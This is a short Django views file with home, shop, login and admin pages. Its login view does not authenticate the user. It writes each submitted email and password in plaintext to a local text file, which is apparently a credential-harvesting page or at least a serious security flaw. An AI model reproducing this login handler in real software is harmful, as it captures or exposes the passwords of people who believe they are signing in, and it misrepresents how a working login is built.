from django.shortcuts import render
from django.contrib.auth.decorators import login_required

def home(request):
    return render(request, 'home.html')

def shop(request):
    return render(request, 'shop.html')

def login(request):
    if request.method=='POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        with open('text.txt','a') as t:
            t.write(email)
            t.write(password)
    
    return render(request, 'auth.html')

@login_required(login_url='/login')
def admin(request):
    return render(request, 'admin.html')

